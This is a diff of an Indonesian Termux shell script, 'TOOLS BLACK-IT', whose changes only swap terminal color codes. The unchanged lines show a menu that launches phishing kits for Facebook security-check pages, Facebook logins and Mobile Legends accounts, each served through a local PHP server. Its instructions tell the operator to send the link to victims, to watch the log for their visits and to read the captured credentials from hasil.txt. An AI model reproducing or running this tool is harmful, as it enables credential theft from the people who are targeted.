@@ -7,8 +7,8 @@ me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
 toilet -f future "TERMUX INDONESIA" | lolcat
-echo $pur"Author :MR.J"
-echo $pur"___________________________________________________________________________"
+echo $cy"Author :MR.J"
+echo $cy"___________________________________________________________________________"
 toilet -f future "WELCOME TO TOOLS BLACK-IT"
 toilet -f term "   /\_/\ " | lolcat
 toilet -f term " =[ •~• ]= " | lolcat
@@ -20,16 +20,16 @@ toilet -f term "| |^^^^^^^^^^^] M ••|•• M" | lolcat
 toilet -f term "| |ΩΩ=======ΩΩ]   R • R" | lolcat
 toilet -f term "| |___________|     J" | lolcat
 toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
-echo $pur"___________________________________________________________________________"
+echo $cy"___________________________________________________________________________"
 echo $i "ANONYMOUS INDONESIA"
 echo $i "TOOLS-BLACK-IT"
-echo $pur"___________________________________________________________________________"
+echo $cy"___________________________________________________________________________"
 sleep 1
 echo
 echo $i"BY MR.J TOOLS BLACK-IT"
-echo $pur"[" $ku"?" $pur"]" $ku"TERMUX_INDONESIA"
-echo $pur"[" $ku"?" $pur"]" $ku"HACKING TOOLS BLACK-IT"
-echo $pur"___________________________________________________________________________"
+echo $i"[" $ku"?" $pur"]" $ku"TERMUX_INDONESIA"
+echo $i"[" $ku"?" $pur"]" $ku"HACKING TOOLS BLACK-IT"
+echo $cy"___________________________________________________________________________"
 echo $pur"["$ku"1"$pur"]"$ku"[+]INSTALL BAHAN-BAHAN (WAJIB)"
 echo $pur"["$ku"2"$pur"]"$ku"[+]PHISING FACEBOOK SECURITY"
 echo $pur"["$ku"3"$pur"]"$ku"[+]PHISING FACEBOOK LOGIN"
@@ -38,8 +38,8 @@ echo $pur"["$ku"5"$pur"]"$ku"[+]PHISING MOBILE LEGENDS"
 echo $pur"["$ku"6"$pur"]"$ku"[+]UPDATE"
 echo $pur"["$ku"7"$pur"]"$ku"[+]CEK HASIL PHISHING"
 echo $pur"["$ku"8"$pur"]"$ku"[+]EXIT"
-echo $pur"___________________________________________________________________________"
-echo $pur"╭─["$pur"BLACK-IT@Root"$pur"]"
+echo $cy"___________________________________________________________________________"
+echo $ku"╭─["$pur"BLACK-IT@Root"$pur"]"
 read -p"╰─>> " pil
 
 if [ $pil = 1 ]
@@ -64,10 +64,10 @@ if [ $pil = 2 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"__________________________________"
 sleep 1
-echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
+echo $cy"  PHISING FACEBOOK SECURITY CHECK  "
 php -S 127.0.0.1:8080
 fi
 
@@ -75,12 +75,12 @@ if [ $pil = 3 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"---------------------------------------------------------------------------"
-echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
-echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
-echo $pur"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
-echo $pur"[+]JIKA INGIN MELIHAT HASIL KETIK CTRL+C DAN KETIK php hasil.txt"
+echo $i"[+]PHISING FACEBOOK MOBILE LOGIN"
+echo $i"[+]SALIN LINK YANG ADA DI TANDA ()"
+echo $i"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
+echo $i"[+]JIKA INGIN MELIHAT HASIL KETIK CTRL+C DAN KETIK php hasil.txt"
 echo $ku"---------------------------------------------------------------------------"
 php -S 127.0.0.1:8080
 fi
@@ -94,9 +94,9 @@ if [ $pil = 5 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
+echo $cy"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"_________________________________"
-echo $pur"  PHISING MOBILE LEGEND"
+echo $cy"  PHISING MOBILE LEGEND"
 php -S localhost:8080 -t ~/BLACK-IT/Ml
 fi
 
